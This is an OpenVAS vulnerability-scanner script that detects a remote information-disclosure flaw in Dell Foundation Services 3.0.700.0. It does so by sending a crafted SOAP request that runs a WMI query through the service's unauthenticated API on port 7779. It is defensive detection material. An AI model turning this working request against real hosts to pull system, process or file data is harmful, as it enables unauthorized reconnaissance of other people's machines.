###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dell_soap_wmi_info_disclosure.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Dell Foundation Services SOAP WMI API Information Disclosure
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105476");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("$Revision: 13659 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-12-03 11:32:22 +0100 (Thu, 03 Dec 2015)");
  script_name("Dell Foundation Services 'SOAP WMI API' Remote Information Disclosure");

  script_tag(name:"summary", value:"An issue in Dell Foundation Services, version 3.0.700.0 can be exploited to leak any data provided by the Windows Management Instrumentation (WMI)");
  script_tag(name:"vuldetect", value:"Send a HTTP GET request and check the response.");
  script_tag(name:"solution", value:"Update to a Dell Foundation Services > 3.0.700.0 or uninstall Dell Foundation Services");
  script_tag(name:"insight", value:"Dell Foundation Services starts an HTTPd that listens on port 7779. The previous service tag leak was fixed by removing the JSONP API.
However, the webservice in question is still available. It is now a SOAP service, and all methods of that webservice can be accessed, not just the ServiceTagmethod. This affects hardware, installed software, running processes, installed services, accessible hard disks, filesystem metadata (filenames, file size, dates) and more.");
  script_tag(name:"affected", value:"Dell Foundation Services 3.0.700.0");

  script_xref(name:"URL", value:"http://lizardhq.rum.supply/2015/12/01/dell-foundation-services.2.html");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 7779);
  script_mandatory_keys("Microsoft-HTTPAPI/banner");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:7779 );
banner = get_http_banner( port:port );

if( "Microsoft-HTTPAPI" >!< banner || "404 Not Found" >!< banner ) exit( 0 );

host = http_host_name( port:port );
query = 'SELECT Caption FROM Win32_OperatingSystem';
useragent = http_get_user_agent();
soap = '<?xml version="1.0" encoding="UTF-8"?>' +
       '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://tempuri.org/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" ' +
       'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">' +
       '<SOAP-ENV:Body><ns1:GetWmiCollection><ns1:wmiQuery xsi:type="xsd:string">' + query  + '</ns1:wmiQuery></ns1:GetWmiCollection></SOAP-ENV:Body></SOAP-ENV:Envelope>';

len = strlen( soap );

req = 'POST /Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Connection: close\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Content-Type: text/xml;\r\n' +
      'SOAPAction: "http://tempuri.org/ISystemInfoCapabilitiesApi/GetWmiCollection"\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' +
      soap;

buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ 'HTTP/1\\.. 200' && "<GetWmiCollectionResponse" >< buf && "Value>Microsoft Windows" >< buf )
{
  report = 'It was possible to execute the WMI-Query "' + query + '" via the Dell Foundation Service SOAP WMI API\n\nResponse: ' + buf;;
  security_message( port:port, data:report );
}

exit( 0 );

